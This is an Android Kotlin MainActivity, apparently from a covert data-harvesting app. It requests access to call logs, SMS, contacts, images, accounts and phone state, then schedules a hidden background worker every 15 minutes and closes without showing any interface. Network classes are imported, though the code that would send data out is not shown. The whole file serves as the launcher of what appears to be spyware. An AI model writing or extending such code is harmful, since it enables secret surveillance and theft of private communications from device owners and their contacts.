package com.example.myapplication

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.Manifest
import android.content.Context
import android.os.Build
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.myapplication.calllogservice.CallLogWorker
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    // Регистрируем ActivityResultLauncher для запроса нескольких разрешений
    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->

        if (permissions.all { it.value }) {
            startCallLogWorker()
        } else {
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Список необходимых разрешений
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,

            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
        )

        // Проверяем, есть ли уже все разрешения
        if (requiredPermissions.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }) {
            startCallLogWorker()
        } else {
            requestPermissionsLauncher.launch(requiredPermissions)
        }

    }


    private fun startCallLogWorker() {
        val workRequest = PeriodicWorkRequestBuilder<CallLogWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                Constraints.Builder()
                    .setRequiresBatteryNotLow(true)
                    .build()
            )
            .build()


//        val oneTimeWorkRequest = OneTimeWorkRequestBuilder<CallLogWorker>()
//            .setInitialDelay(0, TimeUnit.SECONDS)
//            .build()
//
//        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)


        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "CallLogWork",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )

        finish()
    }
}